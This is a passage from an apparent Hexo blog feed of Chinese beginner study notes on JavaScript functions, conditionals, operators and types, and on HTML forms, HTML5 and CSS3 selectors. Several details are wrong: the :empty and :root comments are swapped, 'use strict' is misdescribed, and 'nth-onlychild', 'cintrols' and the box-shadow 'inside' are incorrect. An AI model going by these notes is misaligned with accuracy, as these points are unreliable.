&quot;内容&quot;这样子来传参返回值return执行时，函数停止，并将值返回给调用代码，没有返回值会导致函数立即退出并为undefined</code></pre><p>局部变量:<br>在函数中声明的变量只在该函数内部可见</p><p>外部变量:<br>函数也可以访问外部变量<br>函数对外部变量拥有全部的访问权限。函数也可以修改外部变量。<br>函数内部声明了同名变量，那么函数会遮蔽外部变量</p><pre><code>默认参数的计算:在JS中，函数在没带个别参数的情况下被调用，默认参数会被计算出来。如果传递了参数text，那么anotherFunction()就不会被调用。如果没传递参数text，那么anotherFunction()就会被调用。function showMessage(from, text = anotherFunction()) &#123;  // anotherFunction() 仅在没有给定 text 时执行  // 其运行结果将成为 text 的值&#125;也可以这样function showCount(count) &#123;  // 如果 count 为 undefined 或 null，则提示 &quot;unknown&quot;  alert(count ?? &quot;unknown&quot;);&#125;showCount(0); // 0showCount(null); // unknownshowCount();                        // unknown或者这样function showMessage(text) &#123;  // ...  if (text === undefined) &#123;         // 如果参数未被传递进来    text = &#39;empty message&#39;;  &#125;  alert(text);&#125;showMessage();                      // empty message还可以这样function showMessage(text) &#123;  // 如果 text 为 undefined 或者为假值，那么将其赋值为 &#39;empty&#39;  text = text || &#39;empty&#39;;  alert(text);&#125;showMessage();                     // empty</code></pre><p>返回值</p><pre><code>function doNothing() &#123; /* 没有代码 */ &#125;alert( doNothing());函数无返回值，它就会像返回 undefined 一样空值的 return 和 return undefined 等效如果想要将返回的表达式写成跨多行的形式，那么应该在return的同一行开始写此表达式(比如先写个括号)</code></pre><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>作为参数传递给函数的值，会被复制到函数的局部变量。<br>函数可以访问外部变量。但它只能从内到外起作用。函数外部的代码看不到函数内的局部变量。<br>函数可以返回值。如果没有返回值，则其返回的结果是 undefined。<br>为了使代码简洁易懂，建议在函数中主要使用局部变量和参数，而不是外部变量<br>获取参数、使用参数并返回结果的函数更容易理解。<br>一个好的函数名能够让我们马上知道这个函数的功能是什么，会返回什么。<br>一个单独的函数不仅更容易测试和调试 —— 它的存在本身就是一个很好的注释！</p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><p>一月添香<br>二月夜未央<br>三月情诗慌张<br>四月对镜补红妆<br>五月相携游马十方<br>六月日日笙歌抛流光<br>七月为卿斟唱曲水流觞<br>八月年华辗转处陌上成双<br>九月田中百花争艳怜意满腔<br>十月眠里光阴归去思念倾满江<br>十一月冬雷阵阵我笑悲歌不恸上苍<br>十二月天寒地冻凭楼伫等把痴梦熬荒<br>可叹，人间再无双</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript基础（2）</title>
      <link href="/2022/11/02/b-16/"/>
      <url>/2022/11/02/b-16/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="条件分支"><a href="#条件分支" class="headerlink" title="条件分支"></a>条件分支</h4><h5 id="一，if"><a href="#一，if" class="headerlink" title="一，if"></a>一，if</h5><p>括号里的条件表达式计算结果是 true，就会执行对应的代码块<br>如果有多个语句要执行，我们必须将要执行的代码块封装在大括号内</p><h5 id="二，布尔转换"><a href="#二，布尔转换" class="headerlink" title="二，布尔转换"></a>二，布尔转换</h5><p>if语句会计算圆括号内的表达式，并将计算结果转换为布尔型<br>数字0、空字符串””、null、undefined和NaN都会被转换成false。因为它们被称为“假值（falsy）”。<br>其他值被转换为 true，所以它们被称为“真值（truthy）”。</p><h5 id="三，else"><a href="#三，else" class="headerlink" title="三，else"></a>三，else</h5><p>if 语句判断条件不成立，就会执行它内部的代码</p><h5 id="四，多个条件"><a href="#四，多个条件" class="headerlink" title="四，多个条件"></a>四，多个条件</h5><pre><code>let year = prompt(&#39;提示语&#39;, &#39;&#39;);            #设置变量并赋值                                            #prompt相当于inputif (year &lt; 2015) &#123;                          #判断条件  alert( &#39;Too early...&#39; );                  #成立就执行alert，相当于print&#125; else if (year &gt; 2015) &#123;                   #另一个条件判断  alert( &#39;Too late&#39; );&#125; else &#123;                                    #若上面的条件都不满足  alert( &#39;Exactly!&#39; );&#125;                                           #大括号要把整个if语句的执行部分都包含起来</code></pre><h5 id="五，条件运算符"><a href="#五，条件运算符" class="headerlink" title="五，条件运算符?"></a>五，条件运算符?</h5><p>(有时被称为三元运算符,因为该运算符中有三个操作数,它是 JavaScript 中唯一一个有这么多操作数的运算符)<br>根据一个条件去赋值一个变量</p><pre><code>let result = condition ? value1 : value2;计算条件结果，如果结果为真，则返回 value1，否则返回 value2。condition(条件判断)尽量用括号包起来注意空格</code></pre><h5 id="六，多个"><a href="#六，多个" class="headerlink" title="六，多个?"></a>六，多个?</h5><pre><code>let age = prompt(&#39;age?&#39;, 18);let message = (age &lt; 3) ? &#39;Hi, baby!&#39; :  (age &lt; 18) ? &#39;Hello!&#39; :  (age &lt; 100) ? &#39;Greetings!&#39; :  &#39;What an unusual age!&#39;;alert( message );相当于if (age &lt; 3) &#123;  message = &#39;Hi, baby!&#39;;&#125; else if (age &lt; 18) &#123;  message = &#39;Hello!&#39;;&#125; else if (age &lt; 100) &#123;  message = &#39;Greetings!&#39;;&#125; else &#123;  message = &#39;What an unusual age!&#39;;&#125;</code></pre><h5 id="七，-的非常规使用"><a href="#七，-的非常规使用" class="headerlink" title="七，?的非常规使用"></a>七，?的非常规使用</h5><pre><code>有时可以使用问号 ? 来代替 if 语句：let company = prompt(&#39;Which company created JavaScript?&#39;, &#39;&#39;);(company == &#39;Netscape&#39;) ?   alert(&#39;Right!&#39;) : alert(&#39;Wrong.&#39;);注意缩进</code></pre><h4 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h4><h5 id="（或）"><a href="#（或）" class="headerlink" title="||（或）"></a>||（或）</h5><p>任意一个参数为 true，返回的结果就为 true，否则返回 false<br>如果操作数不是布尔值，那么它将会被转化为布尔值来参与运算<br>例如 1 被作为 true 处理， 0 则被作为 false</p><h5 id="amp-amp-（与）"><a href="#amp-amp-（与）" class="headerlink" title="&amp;&amp;（与）"></a>&amp;&amp;（与）</h5><p>两个操作数都是真值时，与运算返回 true，否则返回 false<br>函数 alert 返回了 undefined,所以会运算并输出alert然后停止</p><h5 id="（非）"><a href="#（非）" class="headerlink" title="!（非）"></a>!（非）</h5><p>将操作数转化为布尔类型：true/false<br>返回相反的值<br>!! 有时候用来将某个值转化为布尔类型<br>(第一个非运算将该值转化为布尔类型并取反，第二个非运算再次取反。就得到了布尔值的转化)</p><h5 id="（空值合并运算符）"><a href="#（空值合并运算符）" class="headerlink" title="??（空值合并运算符）"></a>??（空值合并运算符）</h5><p>a ?? b 的结果是：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第一个参数不是 null/undefined，则返回第一个参数，否则返回第二个参数</p><h5 id="拓展用法"><a href="#拓展用法" class="headerlink" title="拓展用法:"></a>拓展用法:</h5><p>||寻找第一个真值,&amp;&amp;寻找第一个假值</p><p>原理:一个或运算 || 的链，将返回第一个真值，如果不存在真值，就返回该链的最后一个值<br>运用:(a)获取变量列表或者表达式中的第一个真值<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(b)短路求值<br>注意:  &amp;&amp; 的优先级比或 || 要高<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;不要用 || 或 &amp;&amp; 来取代 if<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;非运算符 ! 的优先级在所有逻辑运算符里面最高<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;?? 运算符的优先级与 || 相同<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;??返回第一个已定义的值</p><h4 id="请加上括号！！！"><a href="#请加上括号！！！" class="headerlink" title="请加上括号！！！"></a>请加上括号！！！</h4><h3 id="训练-登录校验"><a href="#训练-登录校验" class="headerlink" title="训练(登录校验)"></a>训练(登录校验)</h3><pre><code>let firstName = null;let lastName = null;let nickName = &quot;Supercoder&quot;;// 显示第一个已定义的值：alert(firstName ?? lastName ?? nickName ?? &quot;匿名&quot;);let userName = prompt(&quot;Who&#39;s there?&quot;, &#39;&#39;);if (userName === &#39;Admin&#39;) &#123;  let pass = prompt(&#39;Password?&#39;, &#39;&#39;);  if (pass === &#39;TheMaster&#39;) &#123;    alert( &#39;Welcome!&#39; );  &#125; else if (pass === &#39;&#39; || pass === null) &#123;    alert( &#39;Canceled&#39; );  &#125; else &#123;    alert( &#39;Wrong password&#39; );  &#125;&#125; else if (userName === &#39;&#39; || userName === null) &#123;  alert( &#39;Canceled&#39; );&#125; else &#123;  alert( &quot;I don&#39;t know you&quot; );&#125;</code></pre><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><h5 id="人的一生中总会有某个时刻，需要坚守自己的决定。一个说“这就是我，这就是我的选择”的时刻。"><a href="#人的一生中总会有某个时刻，需要坚守自己的决定。一个说“这就是我，这就是我的选择”的时刻。" class="headerlink" title="人的一生中总会有某个时刻，需要坚守自己的决定。一个说“这就是我，这就是我的选择”的时刻。"></a>人的一生中总会有某个时刻，需要坚守自己的决定。一个说“这就是我，这就是我的选择”的时刻。</h5>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript基础（1）</title>
      <link href="/2022/11/01/b-15/"/>
      <url>/2022/11/01/b-15/</url>
      
        <content type="html"><![CDATA[<h4 id="从今天开始学习JavaScript啦！"><a href="#从今天开始学习JavaScript啦！" class="headerlink" title="从今天开始学习JavaScript啦！"></a>从今天开始学习JavaScript啦！</h4><h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h4><p>1.概念<br>&nbsp; &nbsp; 这种编程语言写出来的程序被称为脚本。它们可以被直接写在网页的 HTML 中，在页面加载的时候自动执行。<br>&nbsp; &nbsp; 脚本被以纯文本的形式提供和执行。它们不需要特殊的准备或编译即可运行。<br>2.JavaScript 引擎<br>&nbsp; &nbsp;首先，引擎（如果是浏览器，则引擎被嵌入在其中）读取（“解析”）脚本。<br>&nbsp; &nbsp;然后，引擎将脚本转化（“编译”）为机器语言。<br>&nbsp; &nbsp;然后，机器代码快速地执行。<br>3.作用<br>&nbsp; &nbsp;JavaScript 可以做与网页操作、用户交互和 Web 服务器相关的所有事情。<br>4.局限性<br>&nbsp; &nbsp;(1)网页中的 JavaScript 没有直接访问操作系统的功能。<br>&nbsp; &nbsp;(2)不同的标签页/窗口之间通常互不通信(“同源策略”)为了解决“同源策略”问题，两个标签页必须&lt;都&gt;包含一些处理这个问题的特定的 JavaScript 代码，并均允许数据交换。<br>&nbsp; &nbsp;(3)可以轻松地通过互联网与当前页面所在的服务器进行通信</p><h4 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h4><pre><code>1.markup(标签)   type 特性：&lt;script type=…&gt;                                           #已不需要   language 特性：&lt;script language=…&gt;                                   #已不需要2.外部脚本   将大量的 JavaScript 代码放入一个单独的文件。   脚本文件可以通过 src 特性（attribute）添加到 HTML 文件中。   使用独立文件的好处是浏览器会下载它，然后将它保存到浏览器的 缓存 中。   之后，其他页面想要相同的脚本就会从缓存中获取，而不是下载它。所以文件实际上只会下载一次。   这可以节省流量，并使得页面（加载）更快。   &lt;script src=&quot;路径&quot;&gt;&lt;/script&gt;                                        #要附加多个脚本，请使用多个标签   注意:如果设置了 src 特性，script 标签内容将会被忽略。3.语句   在代码中编写任意数量的语句。语句之间可以使用;进行分割。                #可以放在一行或多行   当存在换行符时，在大多数情况下可以省略分号(自动分号插入)4.注释   单行注释以两个正斜杠字符 // 开始。                                    #Ctrl+/快捷键   /* 多行注释*/5.现代模式(&quot;use strict&quot;)   &quot;use strict&quot; 出现在脚本的最顶部,保证旧的功能能够使用</code></pre><h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><pre><code>1.概念   let message;                                                        #创建（声明或者定义）一个名称为“message”的变量   message = &#39;Hello&#39;;                                                  #为变量添加一些数据2.变量命名限制   首字符必须非数字   变量名称必须仅包含字母、数字、符号 $ 和 _   可以将变量定义和赋值合并成一行,也可以在一行中声明多个变量   对于确定不变的变量尽量使用大写3.常数变量   声明一个常数（不变）变量，可以使用const而非let</code></pre><h4 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h4><pre><code>1.Number 类型   包括整数，浮点数和特殊数值(Infinity、-Infinity 和 NaN)   NaN代表计算错误。它是不正确或者未定义的数学操作所得到的结果,任何对NaN的进一步数学运算都会返回NaN,除了NaN**0=12.BigInt 类型   BigInt用于表示任意长度的整数。可以通过将n附加到整数字段的末尾来创建BigInt值。3.String 类型   字符串必须被括在引号里(单双引号无区别，反引号是功能扩展，允许我们通过将变量和表达式包装在$&#123;…&#125;中)   在反引号内$&#123;…&#125;的表达式会被计算4.Boolean 类型(逻辑类型)   仅包含两个值true和false   布尔值也可作为比较的结果5.null 值   null值不属于上述任何一种类型,它构成了一个独立的类型，只包含 null 值   null仅仅是一个代表“无”、“空”或“值未知”的特殊值6.undefined 值   特殊值undefined和null一样自成类型,undefined的含义是未被赋值   如果一个变量已被声明，但未被赋值，那么它的值就是 undefined   通常使用null将一个“空”或者“未知”的值写入变量，而undefined则保留作为未进行初始化的事物的默认初始值7.Object 类型   object 用于储存数据集合和更复杂的实体8.Symbol 类型   symbol 类型用于创建对象的唯一标识符9..typeof 运算符   typeof 运算符以字符串的形式返回数据类型注:typeof null的结果为&quot;object&quot;。这是官方承认的typeof的错误   typeof alert的结果是&quot;function&quot;,因为alert在JavaScript语言中是一个函数,   函数隶属于object类型。但是typeof会对函数区分对待，并返回&quot;function&quot;   typeof(x)与typeof x相同</code></pre><h4 id="交互"><a href="#交互" class="headerlink" title="交互"></a>交互</h4><pre><code>alert   alert(&quot;Hello&quot;);   显示模态窗(modal) ,直到他们处理完窗口prompt   result = prompt(title, [default]);   显示一个带有文本消息的模态窗口，还有input框和确定/取消按钮   title是显示给用户的文本，default是指定input框的初始值。 (中括号可去)   不提供default的话，浏览器会把undefined插入到prompt   prompt将返回用户在input框内输入的文本，如果用户取消了输入，则返回null   显示一个带有文本消息的模态窗口，还有input框和确定/取消按钮confirm   result = confirm(question);   显示一个带有question以及确定和取消两个按钮的模态窗口。   点击确定返回true,点击取消返回false。限制性:    模态窗口的确切位置由浏览器决定。通常在页面中心。    窗口的确切外观也取决于浏览器。我们不能修改它。</code></pre><h4 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h4><p>字符串转换&nbsp;&nbsp;x = String(x);<br>数字型转换&nbsp;&nbsp;Number(x)x<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;字符串变成NaN(存在字符)或0(除换行符\n制表符\t外为空)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;undefined变成NaN<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;null变成0<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;true 和 false变成1 and 0<br>布尔型转换&nbsp;&nbsp;Boolean(x)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;直观上为“空”的值（如 0、空字符串、null、undefined 和 NaN）将变为 false。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其他值变成 true。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;非空的字符串总是 true(PHP等语言视 “0” 为 false而js不是)</p><p>自动转换:<br>&nbsp;&nbsp;&nbsp;&nbsp;运算符和函数会自动将赋予它们的值转换为正确的类型<br>&nbsp;&nbsp;&nbsp;&nbsp;alert会自动将任何值都转换为字符串以进行显示;算术函数和表达式中会自动进行number类型转换</p><h4 id="基础运算符，数学运算"><a href="#基础运算符，数学运算" class="headerlink" title="基础运算符，数学运算"></a>基础运算符，数学运算</h4><h5 id="详见知识点"><a href="#详见知识点" class="headerlink" title="详见知识点"></a>详见<a href="https://zh.javascript.info/operators#yong-er-yuan-yun-suan-fu-lian-jie-zi-fu-chuan">知识点</a></h5><p>1.加号 + 用于求和<br>&nbsp;&nbsp;&nbsp;应用于字符串，连接各个字符串<br>&nbsp;&nbsp;&nbsp;只要任意一个运算元是字符串，那么另一个运算元也将被转化为字符串</p><p>2.数字转化，一元运算符 +<br>&nbsp;&nbsp;&nbsp;+ 应用于单个值，对数字没有任何作用。但是如果运算元不是数字，加号 + 则会将其转化为数字<br>&nbsp;&nbsp;&nbsp;效果和 Number(…) 相同，但是更加简短</p><p>3.<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Operator_Precedence">运算符优先级</a><br>&nbsp;&nbsp;&nbsp;一元运算符优先级高于二元运算符</p><p>4.其他运算方式<br>&nbsp;&nbsp;&nbsp;链式赋值 a = b = c = 2;<br>&nbsp;&nbsp;&nbsp;原地修改 n += 5;<br>&nbsp;&nbsp;&nbsp;自增/自减counter++;相当于counter = counter + 1;<br>&nbsp;&nbsp;&nbsp;自增/自减只能应用于变量，应用于数值（比如 5++）会报错<br>&nbsp;&nbsp;&nbsp;运算符 ++ 和 – 可以置于变量前，也可以置于变量后。<br>&nbsp;&nbsp;&nbsp;++和–放在前面使用的是自增后的值，放在后面是自增前的值<br>&nbsp;&nbsp;&nbsp;位运算符及<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Expressions_and_Operators#bitwise_operators">位操作符</a>:按位与 ( &amp; )按位或 ( | )按位异或 ( ^ )按位非 ( ~ )左移 ( &lt;&lt; )右移 ( &gt;&gt; )无符号右移 ( &gt;&gt;&gt; )<br>&nbsp;&nbsp;&nbsp;逗号运算符丢弃逗号前的结果，保留逗号后的</p><h4 id="值的比较"><a href="#值的比较" class="headerlink" title="值的比较"></a>值的比较</h4><p>一，比较结果为 Boolean 类型<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;所有比较运算符均返回布尔值<br>二，字符串比较<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;按字符（母）逐个进行比较的<br>三，不同类型间的比较<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;先将其转化为数字再判定大小(true 会被转化为 1、false 转化为 0)<br>四，严格相等<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;严格相等运算符 === 在进行比较时不会做任何的类型转换(属于不同的数据类型就立刻返回 false)<br>五，比较 null 和 undefined<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;严格相等 === 比较二者时false<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;非严格相等 == 比较二者时true<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;数学式或其他比较方法 &lt; &gt; &lt;= &gt;= 时null 被转化为 0，undefined 被转化为 NaN<br>六，其它<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;null 会被转化为0<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;undefined 在比较中被转换为了 NaN，而 NaN 是一个特殊的数值型值，它与任何值进行比较都会返回 false<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;undefined 只与 null 相等</p><h4 id="总结问题"><a href="#总结问题" class="headerlink" title="总结问题"></a>总结问题</h4><pre><code>比较运算符始终返回布尔值。字符串的比较，会按照“词典”顺序逐字符地比较大小。当对不同类型的值进行比较时，它们会先被转化为数字（不包括严格相等检查）再进行比较。在非严格相等 == 下，null 和 undefined 相等且各自不等于任何其他的值。在使用 &gt; 或 &lt; 进行比较时，需要注意变量可能为 null/undefined 的情况。比较好的方法是单独检查变量是否等于 null/undefined。对于取值可能是 null/undefined 的变量，请按需要分别检查它的取值情况。除了严格相等 === 外，其他但凡是有 undefined/null 参与的比较，我们都需要格外小心。除非你非常清楚自己在做什么，否则永远不要使用 &gt;= &gt; &lt; &lt;= 去比较一个可能为 null/undefined 的变量。</code></pre><h2 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h2><h4 id="一愿识尽天下好人，二愿读尽世间好书，三愿看尽人间好山水。"><a href="#一愿识尽天下好人，二愿读尽世间好书，三愿看尽人间好山水。" class="headerlink" title="一愿识尽天下好人，二愿读尽世间好书，三愿看尽人间好山水。"></a>一愿识尽天下好人，二愿读尽世间好书，三愿看尽人间好山水。</h4>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML&amp;CSS拓展（6）</title>
      <link href="/2022/10/31/b-14/"/>
      <url>/2022/10/31/b-14/</url>
      
        <content type="html"><![CDATA[<h1 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h1><h3 id="复选框"><a href="#复选框" class="headerlink" title="复选框"></a>复选框</h3><pre><code>&lt;input type=&quot;radio&quot; name=&quot;1&quot; id=&quot;man&quot;&gt;&lt;label for=&quot;man&quot;&gt;男&lt;/label&gt;这里做一个补充:id是为了点击文字也可以选中，不然就只能点击那个圈来选了回归正轨1.type=&quot;checkbox&quot;可以多选2.type=&quot;checkbox&quot; checked=&quot;checked&quot;就能变成默认选中3.disabled=&quot;disabled&quot;或者disabled可以禁用该模块4.readonly是只读不能改</code></pre><h3 id="下拉菜单"><a href="#下拉菜单" class="headerlink" title="下拉菜单"></a>下拉菜单</h3><pre><code>&lt;body&gt;    &lt;select size=&quot;3&quot; multiple&gt;                              #size是一面可显示的选项  multiple是可多选        &lt;option value=&quot;a&quot;&gt;&lt;/option&gt;        &lt;option value=&quot;b&quot;&gt;&lt;/option&gt;                         #value是提供给后端使用的value值        &lt;option value=&quot;c&quot;&gt;&lt;/option&gt;        &lt;option value=&quot;d&quot; selected&gt;&lt;/option&gt;                #selected默认选中    &lt;/select&gt;&lt;/body&gt;</code></pre><h3 id="文本域-多行文本输入框"><a href="#文本域-多行文本输入框" class="headerlink" title="文本域(多行文本输入框)"></a>文本域(多行文本输入框)</h3><pre><code>&lt;div&gt;    &lt;textarea name=&quot;&quot; id=&quot;&quot; cols=&quot;30&quot; rows=&quot;10&quot; placeholder=&quot;&quot;&gt;内容&lt;/textarea&gt;&lt;/div&gt;cols是列   rows是行placeholder是预置文本，输入就会消失&lt;style&gt;    textarea&#123;        width:100px;        height:100px;        resize:vertical;    &#125;&lt;/style&gt;horizontal水平可调节both都可以none不能更改注意:placeholder的默认value是两个标识符之间的，换行也会跟着换行</code></pre><h3 id="字段集"><a href="#字段集" class="headerlink" title="字段集"></a>字段集</h3><pre><code>&lt;fieldset&gt;    &lt;legend&gt;内容1&lt;/legend&gt;    &lt;input type=&quot;radio&quot; name=&quot;aaa&quot;&gt;选项1    &lt;input type=&quot;radio&quot; name=&quot;aaa&quot;&gt;选项2    &lt;legend&gt;内容2&lt;/legend&gt;&lt;/fieldset&gt;</code></pre><h2 id="HTML5"><a href="#HTML5" class="headerlink" title="HTML5"></a>HTML5</h2><p>1.指定UTF-8<br>2.增加语义化标签(便于爬虫)<br>&nbsp;&nbsp; section,article,aside,header,footer,nav,figure,main<br>3.可以省略结束标签(最好不要)<br>4.在标签中可以使用单引号<br>5.音视频标签</p><pre><code>&lt;body&gt;    &lt;audio src=&quot;路径&quot; cintrols&gt;&lt;/audio&gt;    &lt;video src=&quot;路径&quot; poster=&quot;路径&quot;&gt;&lt;/video&gt;&lt;/body&gt;controls 可控制loop 循环autoplay 自动播放muted 静音播放poster 海报注意:设置宽高要适应视频画面大小</code></pre><h3 id="表单增强-以上传后端为例"><a href="#表单增强-以上传后端为例" class="headerlink" title="表单增强(以上传后端为例)"></a>表单增强(以上传后端为例)</h3><pre><code>一，颜色选择&lt;form action=&quot;action&quot;&gt;    &lt;input type=&quot;color&quot; name=&quot;aaa&quot; autofocus&gt;            #选择颜色，autofocus光标默认在这里    &lt;input type=&quot;email&quot; name=&quot;mymail&quot; required&gt;          #选择邮箱，required必填项    &lt;input type=&quot;url&quot; name=&quot;bbb&quot; multiple&gt;               #选择地址，multiple可选择多个地址，用逗号隔开    &lt;input type=&quot;tel&quot; name=&quot;ccc&quot;&gt;                        #tel只在手机端有用，显示输入页面    &lt;input type=&quot;range&quot; name=&quot;ddd&quot; min=&quot;100&quot; max=&quot;1000&quot; value=&quot;100&quot; step=&quot;10&quot;&gt;    #range滑块效果    &lt;input type=&quot;number&quot; name=&quot;eee&quot; min=&quot;0&quot; max=&quot;10&quot; value=&quot;4&quot; step=&quot;2&quot;&gt;          #选择数字，value是初始数据    &lt;input type=&quot;search&quot; name=&quot;fff&quot;&gt;                     #搜索框    &lt;input type=&quot;date&quot; name=&quot;ggg&quot;&gt;                       #选择日期，type改成month是精确到月份    &lt;input type=&quot;datetime-local&quot; name=&quot;hhh&quot;&gt;             #精确到秒&lt;/form&gt;注意！！！没有name就不能传到后端，提交了会在url上显示二，数据列表&lt;body&gt;    &lt;input type=&quot;text&quot; list=&quot;mylist&quot;&gt;              这里的list    &lt;datalist id=&quot;mylist&quot;&gt;                         和这里的id关联        &lt;option value=&quot;111111&quot;&gt;&lt;/option&gt;        &lt;option value=&quot;2433445&quot;&gt;&lt;/option&gt;        &lt;option value=&quot;333436653&quot;&gt;&lt;/option&gt;        上面输入就可以在下面显示有关的内容        &lt;option value=&quot;4、3、78&quot;&gt;&lt;/option&gt;    &lt;/datalist&gt;&lt;/body&gt;三，正则表达式在input中加入 pattern=&quot;[0-9][A-Z]&#123;3&#125;&quot;代表第一个要是0-9的，后面接着三个要是A-Z的</code></pre><h2 id="CSS3"><a href="#CSS3" class="headerlink" title="CSS3"></a>CSS3</h2><h4 id="选择器回顾-更新"><a href="#选择器回顾-更新" class="headerlink" title="选择器回顾+更新"></a>选择器回顾+更新</h4><pre><code>一，层级选择器+属性选择器&lt;style&gt;    .child+li&#123;                       #这个child后面的第一个同级的li标签改变        background:red;            &#125;    .child~li&#123;                       #这个后面所有同级的li标签都改变        background:red;    &#125;    div[class]&#123;                      #所有div而且有class的都改变        background:red;    &#125;    div [class]&#123;                     #加了空格，div后代有class的都改变        background:red;    &#125;    div[class=box1]&#123;                 #是div而且属性是box1的才改变        background:red;    &#125;&lt;/style&gt;拓展————模糊匹配:class^&quot;b&quot;   以b开头的class$&quot;b&quot;   以b结尾的class*&quot;b&quot;   包含b的二，结构伪类选择器&lt;style&gt;    ul li:first-child&#123;       #选择第一个        color:red;    &#125;    ul li:last-child&#123;        #最后一个        color:red;    &#125;    li:nth-child(odd)&#123;       #选定第几个，odd/2n+1/2n-1是奇数，2n/even是偶数        color:red;    &#125;    li:nth-onlychild&#123;        #匹配div下而且只有一个p的        color:red;    &#125;    div:empty&#123;               #匹配根元素(HTML)        color:red;    &#125;    :root,body&#123;              #匹配没有任何元素的，包括空格        color:red;    &#125;&lt;/style&gt;三，目标伪类选择器div.&#123;                        #先让全部使用一个style    display:none;&#125;div.:target&#123;                 #再让点到的目标换成指定的style    display:block;&#125;四，UI状态伪类选择器input:checked&#123;               #匹配选择的    background:red;  &#125;        input:focus&#123;         #匹配手动focus的    background:red;&#125;四，否定伪类选择器li:not(:nth-child(2n+1))&#123;    #匹配所有不匹配的    color:red;&#125;其它:X:link  链接伪类选择器，超链接未被访问过的X:visited  链接伪类选择器，超链接被访问过的X:active  用户行为选择器，被激活的(常用于链接)X:hover  用户行为选择器，停留在上方的</code></pre><h3 id="阴影"><a href="#阴影" class="headerlink" title="阴影"></a>阴影</h3><pre><code>文本阴影div&#123;    text-shadow:10px -10px 1px red;     #水平方向，垂直方向，模糊程度，阴影颜色&#125;如果要多个阴影，在颜色后面加逗号之后再加上另一个的参数，分号不要漏!!!盒子阴影div&#123;    width:100px;    ...    box-shadow: 10px(水平) 10px(垂直) 1px(模糊程度) 10px(阴影大小) red inside(内阴影);&#125;</code></pre><h3 id="圆角边框-放在style里"><a href="#圆角边框-放在style里" class="headerlink" 